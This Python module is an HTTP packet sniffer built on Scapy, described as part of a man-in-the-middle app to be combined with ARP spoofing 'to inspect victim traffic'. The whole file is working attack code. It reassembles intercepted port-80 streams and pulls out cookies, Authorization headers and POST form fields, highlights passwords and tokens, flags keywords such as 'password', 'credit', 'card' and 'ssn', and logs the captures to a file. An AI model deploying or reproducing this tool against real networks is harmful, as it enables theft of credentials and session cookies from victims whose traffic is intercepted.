"""
HTTP Packet Sniffer Module
Captures and displays HTTP traffic passing through the machine during MITM.
Extracts URLs, cookies, form data, user-agents, and response codes.

Useful when combined with ARP spoofing to inspect victim traffic.
"""
import os
import re
import threading
import time
from collections import defaultdict
from datetime import datetime
from urllib.parse import unquote

try:
    from scapy.all import (
        IP, TCP, Raw, Ether,
        sniff, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════
_running = False
_sniff_thread = None
_stats = defaultdict(int)
_output_file: str | None = None
_verbose: bool = True  # Show all requests, or just interesting ones

# TCP stream reassembly: session_key -> bytes
_sessions: dict[tuple, bytearray] = {}
# Track which sessions we've already parsed to avoid duplicates
_parsed_sessions: set[tuple] = set()

# Session tracking metadata
_session_metadata: dict[tuple, dict] = {}


# ══════════════════════════════════════════════════════════════
#  SEARCHABLE PATTERNS (for filtering)
# ══════════════════════════════════════════════════════════════
INTERESTING_KEYWORDS = [
    "password", "passwd", "user", "login", "auth", "token", "secret",
    "session", "credential", "admin", "key", "api", "credit", "card",
    "ssn", "email", "signin", "signup", "register",
]

INTERESTING_EXTENSIONS = [
    ".php", ".asp", ".aspx", ".jsp", ".cgi", ".json", ".xml",
]

INTERESTING_HEADERS = [
    "authorization", "cookie", "set-cookie", "x-auth-token",
    "x-csrf-token", "x-api-key",
]


# ══════════════════════════════════════════════════════════════
#  OUTPUT FORMATTING
# ══════════════════════════════════════════════════════════════
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_DIM = "\033[2m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE = "\033[94m"
C_CYAN = "\033[96m"
C_MAGENTA = "\033[95m"


def _maybe_color(text: str, color: str) -> str:
    """Apply ANSI color if stdout supports it (Windows 10+ does via terminal)."""
    return f"{color}{text}{C_RESET}"


def _truncate(text: str, max_len: int = 100) -> str:
    """Truncate long strings for display."""
    if len(text) > max_len:
        return text[:max_len - 3] + "..."
    return text


# ══════════════════════════════════════════════════════════════
#  TCP SESSION TRACKING
# ══════════════════════════════════════════════════════════════
def _session_key(packet) -> tuple | None:
    """Get a consistent 4-tuple key for a TCP session."""
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return None
    ip = packet[IP]
    tcp = packet[TCP]
    # Order consistently: lower IP:port first
    if (ip.src, tcp.sport) < (ip.dst, tcp.dport):
        return (ip.src, tcp.sport, ip.dst, tcp.dport)
    return (ip.dst, tcp.dport, ip.src, tcp.sport)


def _is_interesting(data: bytes) -> bool:
    """Check if HTTP data contains interesting content (passwords, auth, etc.)."""
    data_lower = data.lower()
    for kw in INTERESTING_KEYWORDS:
        if kw.encode() in data_lower:
            return True
    return False


# ══════════════════════════════════════════════════════════════
#  HTTP PARSING
# ══════════════════════════════════════════════════════════════
def _parse_http(data: bytes, src_ip: str, dst_ip: str) -> dict | None:
    """
    Parse HTTP data from a TCP stream.
    Returns a dict with parsed fields, or None if incomplete/invalid.
    """
    if not data or len(data) < 4:
        return None

    text = data.decode("utf-8", errors="replace")
    lines = text.split("\r\n")

    if len(lines) < 1:
        return None

    first_line = lines[0]

    # Determine if request or response
    is_request = False
    is_response = False

    # Request: GET /path HTTP/1.x  or  POST /path HTTP/1.x
    if re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT|TRACE)\s", first_line):
        is_request = True
    # Response: HTTP/1.x 200 OK
    elif re.match(r"^HTTP/\d\.\d\s+\d{3}", first_line):
        is_response = True
    else:
        return None

    result: dict = {
        "is_request": is_request,
        "is_response": is_response,
        "src": src_ip,
        "dst": dst_ip,
        "method": "",
        "path": "",
        "status": "",
        "host": "",
        "user_agent": "",
        "cookies": [],
        "set_cookies": [],
        "auth": "",
        "content_type": "",
        "content_length": 0,
        "body": "",
        "interesting": False,
        "raw_first_line": first_line,
    }

    # Parse first line
    if is_request:
        parts = first_line.split(" ", 2)
        if len(parts) >= 2:
            result["method"] = parts[0]
            result["path"] = parts[1] if len(parts) > 1 else ""
    else:
        parts = first_line.split(" ", 2)
        if len(parts) >= 2:
            result["status"] = " ".join(parts[1:])

    # Parse headers
    header_end = 0
    for i, line in enumerate(lines[1:], 1):
        if line == "":
            header_end = i
            break
        if ":" not in line:
            continue

        key, _, value = line.partition(":")
        key = key.strip().lower()
        value = value.strip()

        if key == "host":
            result["host"] = value
        elif key == "user-agent":
            result["user_agent"] = value
        elif key == "cookie":
            result["cookies"] = [c.strip() for c in value.split(";")]
        elif key == "set-cookie":
            result["set_cookies"].append(value)
        elif key == "authorization":
            result["auth"] = value
            result["interesting"] = True
        elif key == "content-type":
            result["content_type"] = value
        elif key == "content-length":
            try:
                result["content_length"] = int(value)
            except ValueError:
                pass

    # Parse body (after blank line)
    if header_end > 0 and header_end < len(lines):
        body_lines = lines[header_end + 1:]
        body = "\r\n".join(body_lines)
        if result["content_length"] > 0 and len(body) < result["content_length"]:
            return None  # Incomplete - wait for more data
        result["body"] = body

    # Check for interesting content
    if _is_interesting(data):
        result["interesting"] = True

    return result


def _format_request(result: dict) -> str:
    """Format a parsed HTTP request for display."""
    lines = []
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Method + URL line
    method_color = C_YELLOW if result["method"] == "POST" else C_GREEN
    url = result["path"]
    if result["host"]:
        url = f"http://{result['host']}{result['path']}"

    lines.append(
        f"  {_maybe_color(f'[{timestamp}]', C_DIM)} "
        f"{_maybe_color(result['method'], method_color)} "
        f"{_truncate(unquote(url), 120)}"
    )

    # Source
    lines.append(f"    {_maybe_color('From:', C_DIM)} {result['src']} -> {result['dst']}")

    # Host
    if result["host"]:
        lines.append(f"    {_maybe_color('Host:', C_DIM)} {result['host']}")

    # User-Agent
    if result["user_agent"]:
        lines.append(f"    {_maybe_color('UA:', C_DIM)} {_truncate(result['user_agent'], 80)}")

    # Cookies
    if result["cookies"]:
        for cookie in result["cookies"]:
            c_value = _truncate(cookie, 80)
            lines.append(f"    {_maybe_color('Cookie:', C_MAGENTA)} {c_value}")
            result["interesting"] = True

    # Authorization
    if result["auth"]:
        lines.append(f"    {_maybe_color('Auth:', C_RED)} {_truncate(result['auth'], 80)}")
        result["interesting"] = True

    # Form data (POST body)
    if result["body"] and result["method"] == "POST":
        body_preview = _truncate(unquote(result["body"]), 200)
        lines.append(f"    {_maybe_color('Body:', C_CYAN)} {body_preview}")

        # Try to parse form fields
        if "application/x-www-form-urlencoded" in result["content_type"]:
            for pair in result["body"].split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    v_decoded = unquote(v)
                    highlighted = C_RED if any(
                        kw in k.lower() for kw in ["password", "passwd", "token", "secret"]
                    ) else C_CYAN
                    lines.append(f"    {_maybe_color('  field:', C_DIM)} "
                                 f"{unquote(k)} = {_maybe_color(_truncate(v_decoded, 60), highlighted)}")

    return "\n".join(lines)


def _format_response(result: dict) -> str:
    """Format a parsed HTTP response for display."""
    lines = []
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Status line
    status_color = C_GREEN if result["status"].startswith("2") else (
        C_RED if result["status"].startswith(("4", "5")) else C_YELLOW
    )
    lines.append(
        f"  {_maybe_color(f'[{timestamp}]', C_DIM)} "
        f"{_maybe_color('RESPONSE', C_BLUE)} "
        f"{_maybe_color(result['status'], status_color)} "
        f"<- {result['dst']}"
    )

    # Set-Cookie
    for cookie in result["set_cookies"]:
        lines.append(f"    {_maybe_color('Set-Cookie:', C_MAGENTA)} {_truncate(cookie, 80)}")

    # Content-Type
    if result["content_type"]:
        lines.append(f"    {_maybe_color('Type:', C_DIM)} {result['content_type']}")

    return "\n".join(lines)


# ══════════════════════════════════════════════════════════════
#  PACKET HANDLER
# ══════════════════════════════════════════════════════════════
def _packet_handler(packet):
    """Main sniffing callback."""
    global _stats, _sessions, _parsed_sessions

    if not packet.haslayer(IP) or not packet.haslayer(TCP) or not packet.haslayer(Raw):
        return

    ip = packet[IP]
    tcp = packet[TCP]

    # Only HTTP ports
    if tcp.sport != 80 and tcp.dport != 80:
        return

    # Skip SYN-only, FIN, RST packets
    if not tcp.flags & 0x10:  # ACK flag must be set
        return

    key = _session_key(packet)
    if key is None:
        return

    payload = bytes(tcp[Raw].load) if tcp.haslayer(Raw) else b""
    if not payload:
        return

    _stats["packets"] += 1

    # Buffer data for this session
    if key not in _sessions:
        _sessions[key] = bytearray()
        _session_metadata[key] = {
            "src": ip.src,
            "dst": ip.dst,
            "started": time.time(),
        }
    buff = _sessions[key]
    buff.extend(payload)

    # Try to parse
    result = _parse_http(bytes(buff), ip.src, ip.dst)
    if result is None:
        # Not enough data yet, or not HTTP
        return

    # Successfully parsed!
    _parsed_sessions.add(key)

    # Apply verbosity filter
    if not _verbose and not result["interesting"]:
        pass  # Skip display in smart mode
    else:
        if result["is_request"]:
            output = _format_request(result)
        else:
            output = _format_response(result)
        print(output)
        _log_to_file(output)

    _stats["http_messages"] += 1
    if result.get("interesting"):
        _stats["interesting"] += 1

    # Trim buffer: keep any remaining data after the parsed message
    # (handles HTTP/1.1 keep-alive with multiple messages per connection)
    raw = bytes(buff)
    header_body_split = raw.find(b"\r\n\r\n")
    if header_body_split != -1:
        parsed_bytes = header_body_split + 4  # headers + \r\n\r\n
        content_length = result.get("content_length", 0)
        if content_length > 0:
            parsed_bytes += content_length
        elif result["body"]:
            parsed_bytes += len(result["body"].encode("utf-8"))
        else:
            parsed_bytes = len(buff)
    else:
        parsed_bytes = len(buff)

    remaining = bytes(buff)[parsed_bytes:]
    if remaining and len(remaining) > 4:
        # There's more HTTP data in this session — keep it for next parse
        _sessions[key] = bytearray(remaining)
    else:
        del _sessions[key]

    # Garbage collect old sessions (>60s old)
    now = time.time()
    stale = [k for k, m in _session_metadata.items() if now - m["started"] > 60]
    for k in stale:
        _sessions.pop(k, None)
        _session_metadata.pop(k, None)
        _parsed_sessions.discard(k)


def _log_to_file(text: str):
    """Write captured output to file."""
    if _output_file:
        try:
            # Strip ANSI colors for file output
            clean = re.sub(r"\033\[[0-9;]*m", "", text)
            with open(_output_file, "a", encoding="utf-8") as f:
                f.write(clean + "\n")
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
#  START / STOP
# ══════════════════════════════════════════════════════════════
def configure(output_file: str | None = None, verbose: bool = True):
    """Configure the sniffer."""
    global _output_file, _verbose
    _output_file = output_file
    _verbose = verbose

    if output_file:
        os.makedirs(os.path.dirname(output_file) or "captures", exist_ok=True)


def start(interface: str | None = None) -> bool:
    """Start sniffing HTTP traffic in a background thread."""
    global _running, _sniff_thread

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed.")
        return False

    if _running:
        print("[!] HTTP sniffer is already running.")
        return False

    _running = True
    _stats.clear()
    _sessions.clear()
    _parsed_sessions.clear()
    _session_metadata.clear()

    print(f"\n[*] HTTP Sniffer started")
    print(f"[*] Listening on TCP port 80")
    if _verbose:
        print(f"[*] Mode: Verbose (all requests)")
    else:
        print(f"[*] Mode: Interesting only (auth, cookies, forms)")
    if _output_file:
        print(f"[*] Logging to: {_output_file}")
    print()

    def sniffer():
        try:
            sniff(
                filter="tcp port 80",
                prn=_packet_handler,
                store=0,
                stop_filter=lambda p: not _running,
                iface=interface,
            )
        except Exception as e:
            print(f"\n[!] HTTP sniffer error: {e}")
        finally:
            global _running
            _running = False

    _sniff_thread = threading.Thread(target=sniffer, daemon=True)
    _sniff_thread.start()

    print("[✓] HTTP sniffer active\n")
    return True


def stop():
    """Stop sniffing."""
    global _running, _sniff_thread

    if not _running:
        return

    print("\n[*] Stopping HTTP sniffer...")
    _running = False

    if _sniff_thread:
        _sniff_thread.join(timeout=3.0)
        _sniff_thread = None

    print(f"[*] Captured: {_stats['packets']} packets, "
          f"{_stats['http_messages']} HTTP messages, "
          f"{_stats.get('interesting', 0)} interesting")
    print("[✓] HTTP sniffer stopped\n")


def is_running() -> bool:
    return _running


if __name__ == "__main__":
    print("HTTP Sniffer module - import and use from mitm_app.py")
